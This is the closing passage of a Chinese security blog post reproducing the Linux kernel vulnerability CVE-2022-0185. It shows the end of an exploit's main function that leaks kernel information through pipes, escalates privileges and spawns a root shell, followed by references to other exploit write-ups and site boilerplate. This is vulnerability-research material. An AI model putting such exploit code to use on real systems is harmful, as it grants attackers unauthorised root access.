class="hljs-number">1</span>);<br>        build_self_writing_pipe();sleep(<span class="hljs-number">1</span>);<br>        info_leaking_by_arbitrary_pipe();sleep(<span class="hljs-number">1</span>);<br>        priviledge_escalation();<br>        write(msg_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">10</span>);<br>        sleep(<span class="hljs-number">114514</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(prctl(PR_SET_NAME, <span class="hljs-string">&quot;PEIWITHHAO&quot;</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;failed to prctl!&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">char</span> ch;<br>        read(msg_pipe[<span class="hljs-number">0</span>], &amp;ch, <span class="hljs-number">1</span>);<br>    &#125;<br>    get_root_shell();<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/67686817">醉卧沙场文件系列博客</a></li>
<li><a target="_blank" rel="noopener" href="https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">arttnba3师傅复现博客</a></li>
<li><a target="_blank" rel="noopener" href="https://patchwork.kernel.org/project/linux-security-module/cover/153754740781.17872.7869536526927736855.stgit@warthog.procyon.org.uk/">new mount API introduce</a></li>
<li><a target="_blank" rel="noopener" href="https://rust-for-linux.github.io/docs/kernel/fs/flags/constant.ALLOW_IDMAP.html">rust for linux fs_flags</a></li>
<li><a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/01/cve-2022-0185.html">willsroot‘s analys blog</a></li>
<li><a target="_blank" rel="noopener" href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">拯救之火</a></li>
<li><a target="_blank" rel="noopener" href="https://bsauce.github.io/2022/04/08/CVE-2022-0185/">bsauce师傅复现博客</a></li>
<li><a target="_blank" rel="noopener" href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">a3师傅d3kcache出题笔记</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.kernel.org/admin-guide/kdump/vmcoreinfo.html">kernel doc</a></li>
<li><a target="_blank" rel="noopener" href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/">pipe_buffer相关博客</a></li>
</ol>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/PWN/">#PWN</a>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/Kernel/">#Kernel</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2022-0185漏洞复现</div>
      <div>https://peiandhao.github.io/2023/10/10/CVE-2022-0185/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>peiwithhao</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年10月10日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/01/07/CVE-2016-5195/" title="CVE-2016-5195漏洞复现">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CVE-2016-5195漏洞复现</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="羊城杯部分赛题复现">
                        <span class="hidden-mobile">羊城杯部分赛题复现</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","appKey":"Vr60qrZIptqhJaXqWvDEknkH","path":"window.location.pathname","placeholder":"锐评一下","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Pei</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Hao</span></a> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
